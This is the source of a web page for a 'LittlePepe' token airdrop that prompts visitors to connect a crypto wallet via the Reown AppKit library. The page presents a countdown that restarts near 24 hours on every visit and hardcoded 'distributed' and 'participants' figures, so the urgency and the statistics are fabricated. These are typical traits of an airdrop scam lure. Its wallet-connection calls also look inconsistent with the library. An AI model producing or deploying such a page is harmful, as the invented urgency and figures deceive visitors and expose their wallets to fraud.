<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AirDrop — LittlePepe</title>
<link rel="stylesheet" href="style.css">
<link rel="icon" href="logo.svg" type="image/svg+xml">
<meta name="description" content="Little Pepe airdrop: connecting a wallet (MetaMask/Trust/OKX), без транзакций и без approve.">

<!-- AppKit -->
<script type="module">
import * as AppKitModule from "https://cdn.jsdelivr.net/npm/@reown/appkit@1.7.20/dist/index.js";
import { polygon } from "https://esm.sh/viem/chains";

const projectId = "56edaed968d799280ffd685113d7f126";
const chains = [polygon];

// Инициализация AppKit
const appkit = new AppKitModule.AppKit({
  wagmiConfig: AppKitModule.defaultWagmiConfig({ chains, projectId }),
  projectId,
  chains,
  themeMode: "dark",
  themeVariables: {
    "--w3m-accent-color": "#4caf50",
    "--w3m-background-color": "#121212"
  }
});

window.onload = () => {
  const claimBtn = document.getElementById("claimBtn");
  const copyBtn = document.getElementById("copyBtn");
  const addrBox = document.getElementById("addrBox");
  const networkBox = document.getElementById("networkBox");

  claimBtn.disabled = false;

  claimBtn.addEventListener("click", async () => {
    try {
      const wallet = await appkit.connectWallet(); // открываем меню кошельков
      const address = wallet.address;
      const network = wallet.chain.name || wallet.chain.id;

      addrBox.innerText = address;
      networkBox.innerText = "Network: " + network;

      copyBtn.disabled = false;
    } catch (e) {
      console.error("Ошибка подключения кошелька:", e);
    }
  });

  copyBtn.addEventListener("click", () => {
    const address = addrBox.innerText;
    if (address && address !== "Wallet not connected") {
      navigator.clipboard.writeText(address);
      alert("Address copied!");
    }
  });

  // Таймер AirDrop
  const countdownEl = document.getElementById("countdown");
  let endTime = new Date();
  endTime.setHours(endTime.getHours() + 23);
  endTime.setMinutes(endTime.getMinutes() + 42);
  endTime.setSeconds(endTime.getSeconds() + 56);

  function updateCountdown() {
    let now = new Date();
    let diff = endTime - now;

    if (diff <= 0) {
      countdownEl.innerText = "AirDrop ended!";
      clearInterval(timer);
      return;
    }

    let hours = Math.floor(diff / (1000 * 60 * 60));
    let minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    let seconds = Math.floor((diff % (1000 * 60)) / 1000);

    countdownEl.innerText = `${hours}h ${minutes}m ${seconds}s`;
  }

  let timer = setInterval(updateCountdown, 1000);
  updateCountdown();
};
</script>
</head>
<body>
<header class="nav">
  <div class="brand">
    <img src="logo.svg" alt="logo" class="logo"/>
    <div class="brand-text">
      <div class="title">AIR<span>DROP</span></div>
      <div class="subtitle">Live • Product</div>
    </div>
  </div>
</header>

<main class="container">
  <section class="hero card">
    <h1 id="tokenName">Airdrop: <span>LittlePepe</span> Token</h1>
    <p class="lead">
      Connect your wallet (MetaMask, TrustWallet, Ledger, etc.) and participate in the token distribution.
    </p>

    <div class="stats">
      <div class="stat">
        <div class="stat-num" id="supply">1,000,000</div>
        <div class="stat-label">Total tokens</div>
      </div>
      <div class="stat">
        <div class="stat-num" id="claimable">2,000</div>
        <div class="stat-label">on one member</div>
      </div>
      <div class="stat">
        <div id="countdown">Loading...</div>
        <div class="stat-label">Until the end</div>
      </div>
    </div>

    <div class="card inner">
      <div class="wallet-info">
        <div id="addrBox" class="muted">Wallet not connected</div>
        <div id="networkBox" class="muted">Network: —</div>
      </div>

      <div class="actions">
        <button id="claimBtn" class="btn success" disabled>Claim</button>
        <button id="copyBtn" class="btn" disabled>Copy address</button>
      </div>

      <div id="notice" class="notice">
        <p>⚠️ AirDrop is active: the Claim button создает подключение кошелька.</p>
      </div>
    </div>
  </section>

  <div class="airdrop-tab">
    <h3>Why Choose Our AirDrop?</h3>
    <p>Our AirDrop is designed to reward our community fairly, safely, and transparently.</p>
  </div>

  <div class="airdrop-stats">
    <div class="stat-tab">
      <div class="stat-number" id="total-distributed">742,000</div>
      <div class="stat-label">Total Distributed</div>
    </div>
    <div class="stat-tab">
      <div class="stat-number" id="users-received">371</div>
      <div class="stat-label">Users Participated</div>
    </div>
    <div class="stat-tab">
      <div class="stat-number" id="tokens-left">258,000</div>
      <div class="stat-label">Tokens Left</div>
    </div>
  </div>
</main>

<footer class="footer">
  <div>© 2025 Little Pepe Airdrop. Not affiliated with Little Pepe Foundation.</div>
</footer>
</body>
</html>


